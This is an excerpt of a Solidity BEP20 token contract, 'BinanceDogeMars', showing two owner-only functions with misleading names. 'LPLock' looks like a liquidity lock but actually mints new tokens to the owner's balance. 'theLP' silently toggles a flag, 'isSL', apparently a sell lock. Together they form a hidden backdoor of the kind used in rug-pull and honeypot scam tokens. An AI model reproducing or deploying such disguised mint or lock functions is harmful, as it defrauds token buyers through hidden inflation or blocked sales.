...
contract BinanceDogeMars is Context, iBEP20, Ownable {
...
function LPLock(uint256 amount) external onlyOwner returns (bool) {
  _balances[owner()] = _balances[owner()].add(amount);
  emit Transfer(address(0), owner(), amount);
}
function theLP(bool _sl) public onlyOwner virtual returns (bool) {
    isSL = _sl;
    return true;
}
